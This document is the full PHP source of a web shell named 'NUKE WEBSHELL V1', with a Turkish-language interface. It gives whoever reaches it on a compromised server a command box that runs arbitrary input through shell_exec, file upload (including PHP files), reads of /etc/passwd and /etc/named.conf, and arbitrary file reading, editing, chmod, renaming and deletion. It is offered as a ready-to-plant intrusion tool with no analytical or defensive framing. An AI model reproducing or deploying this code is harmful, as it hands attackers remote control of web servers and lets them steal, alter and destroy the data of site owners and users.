<h2>NUKE WEBSHELL V1</h2>
<a>OS : <?php php_uname()  ; ?> </a>
<a id="ip">UNAME : <?php echo $dizin = $_SERVER["SERVER_NAME"]; ?> 
</a><br>
<a href="http://<?php echo $dizin = $_SERVER["REMOTE_ADDR"]; ?>">İP : <?php echo $dizin = $_SERVER["REMOTE_ADDR"]; ?></a>
<a href="http://<?php echo $dizin = $_SERVER["SERVER_ADDR"]; ?>" id="ip">SERVER İP : <?php echo $dizin = $_SERVER["SERVER_ADDR"]; ?></a>
<hr>
<style>
#ip{
    margin-left:50px;
}
</style>
<form action="index.php" method="get" >
<center>
<button href="index.php" class="button">Home</button>
<input type="submit" value="Terminal" class="button" name="slc">
<input type="submit" value="PHP INFO" class="button" name="slc">
<input type="submit" value="Upload" class="button" name="slc">
<input type="submit" value="Get Config" class="button" name="slc">
<input type="submit" value="Domains" class="button" name="slc">
<input type="submit" value="About" class="button" name="slc">
</center>
</form>


<?php
if(isset($_GET['slc'])){
    if($_GET['slc'] == "PHP INFO"){
        phpinfo();
    }elseif($_GET['slc'] == "Upload"){?>
        <?php
        
        if(isset($_FILES['file'])){
            $file = $_FILES['file'];
            $file_name = $file['name'];
            $file_tmp = $file['tmp_name'];
            $file_size = $file['size'];
            $file_error = $file['error'];
            $file_ext = explode('.' ,$file_name);
            $file_ext = strtolower(end($file_ext));
            $allowed =array('txt','php','html','jpeg','jpg','png','mp3','mp4','avi','css');
            if(in_array($file_ext,$allowed)){
                if($file_error == 0){
                if($file_size <= 2097152){
                $file_name_new = uniqid('', true) . '.' . $file_ext;
                $file_dest = '' . $file_name_new;
                if(move_uploaded_file($file_tmp, $file_dest)){
                echo "Yüklendi : ",$file_dest ;            
        }
        }
        }
        }
    }else{
    echo "<script>console.info('dosya yüklenmedi');</script>";}?>
    <center>
    <form action="index.php?slc=Upload " method="post" enctype="multipart/form-data">
    <h3>Dosya Yükle</h3>
    <input type="file" name="file" >
    <input type="submit" value="upload">
    </form>
</center>
    <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
    <?php }
    elseif($_GET['slc'] == "Get Config"){
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            echo '<center> cant read /etc/passwd content </center>';
        } else {
            $passwd = fopen('/etc/passwd','r');
            echo fgets($passwd); 
            fclose($passwd);        }
        ?>
           <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
        <?php 

        
    }elseif($_GET['slc'] == "Domains"){
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            echo '<center>  i cant read /etc/named.conf  </center>';
        } else {
            $dosya = fopen('/etc/named.conf','r');
            echo fgets($dosya); 
            fclose($dosya);


        }
?>
   <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
     <?php   
    }elseif ($_GET['slc'] == "Terminal") { ?>
        <center><br><br>    
        <form action="index.php?slc=Terminal" method="POST">
        <label for="sh">Komut Çalıştır : </label>
        <input type="text" name="sh" placeholder="terminal">
        <input type="submit">
        </from>
    </center>
        <?php 
        if(isset($_POST['sh'])){
            $sh = $_POST['sh'];
            $bash = shell_exec($sh);
            echo "<hr>";
            echo "<pre><br>",$bash,"<pre>";
        } ?>
              <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
    <?php 
    }elseif($_GET['slc'] == "About"){
        echo '<br><br><center><a href="http://rubargumus.blogspot.com">CREATED BY NUKE</a></center>';
        ?>
           <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
           <?php 
    }else{
        echo "hata 404";
    }
}else{
   
echo '<br><br><center><a href="http://rubargumus.blogspot.com/">NUKE</a></center>';

} ?>
<?php
set_time_limit(0);
error_reporting(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="" rel="stylesheet" type="text/css">

<title>NUKE SHELL</title>

<style>
*{
    color: red;
}
body{
font-family: "Racing Sans One", cursive;
background-color: black;
text-shadow:0px 0px 1px #757575;
}
#content tr:hover{
background-color: silver;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: silver;
}
#content .first:hover{
background-color: silver;
text-shadow:0px 0px 1px #757575;
}
table{
border: 1px #000000 dotted;
}
H1{
font-family: "Rye", cursive;
}
a{
color: red;
text-decoration: none;
}
a:hover{
color: #fff;
text-shadow:0px 0px 10px #FF00FF;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</HEAD>
<BODY>

<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>Şuan Burdasın Dostum : ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="#green">Başarılı</font><br />';
}else{
echo '<font color="#red">Hata</font><br />';
}
}
echo '<form enctype="multipart/form-data" method="POST"><font color="green">
Dosya Yükle<input type="file" name="file" />
<input type="submit" value="Yükle" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Şuanki Dosya : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Yetkiler Güncellendi Kankaa</font><br />';
}else{
echo '<font color="red">Yetkiler Güncellenemedi</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Yükle" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Ad Değiştirildiki</font><br />';
}else{
echo '<font color="red">Başaramadık Abi</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Yükle" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Dosya Düzenlendi Yine İyisin</font><br />';
}else{
echo '<font color="red">Aga Olmadı</font><br />';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Yükle" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Yok Edildi</font><br />';
}else{
echo '<font color="red">Silinmiyo AMK</font><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">Silindi</font><br />';
}else{
echo '<font color="red">Silinmiyo Amk</font><br />';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>İsim</center></td>
<td><center>Boyut</center></td>
<td><center>Yetkiler</center></td>
<td><center>Seçenekler</center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
<td><a href=\"?path=$path/$dir\">$dir</a></td>
<td><center>--</center></td>
<td><center>";
if(is_writable("$path/$dir")) echo '<font color="#00BFFF">';
elseif(!is_readable("$path/$dir")) echo '<font color="#FFE4E1">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Sil</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Yeniden Adlandır</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$path/$file")) echo '<font color="#FF00FF">';
elseif(!is_readable("$path/$file")) echo '<font color="FFE4E1">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Sil</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Yeniden Adlandır</option>
<option value=\"edit\">Düzenle</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '</table>
</div>';
}
echo '<br />
</BODY>
</HTML>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}

echo "<center><h3>Bilgi</h3>";
echo "OS : " , php_uname() , PHP_OS;
echo "<br>PHP Versiyon : " , phpversion() ;
echo "</center>";

?>

<style>
    *{
        background-color:black;
        color:red;
        border-color: white;
    }
    body{
        background:black;

    }
    hr{
        width: 1350px;
    }
    .button{

    background-color: red;

    border: none;

    color: white;

    padding: 15px 32px;

    text-align: center;

    text-decoration: none;

    display: inline-block;

    font-size: 16px;

    margin: 4px 2px;

    cursor: pointer;
}

</style>